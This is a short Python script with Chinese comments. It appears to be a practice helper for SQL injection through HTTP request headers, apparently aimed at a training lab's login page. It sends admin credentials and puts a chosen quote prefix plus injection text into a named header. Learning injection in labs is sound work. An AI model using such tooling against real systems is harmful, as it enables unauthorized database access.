import requests
from bs4 import BeautifulSoup
def toPost(url,header,body,style):
    # 参数三是请求头信息，由参数传递
    response = requests.post(url,body,headers=header)
    soup = BeautifulSoup(response.text, 'html.parser')
    # s=soup.find('font', {'size': '3', 'color': '#0000ff'}).text.strip()
    s=soup.find('font', style).text.strip()
    return s;

# dz是做什么的？ 这个是用于简化发送请求用的 做请求头注入
# 参数一url 参数二请求头名字 参数三urlpayload（‘ 还是 " 还是 ')等 ），参数四注入内容
def dz(url,headerName,urlpayload,zhu):
    h={headerName:urlpayload+zhu}
    # print("payload:"+h[headerName])
    body={"uname":"admin", "passwd": "admin"};
    s=toPost(url,h,body,{'size': '3', 'color': '#FFFF00'})
    print(s)



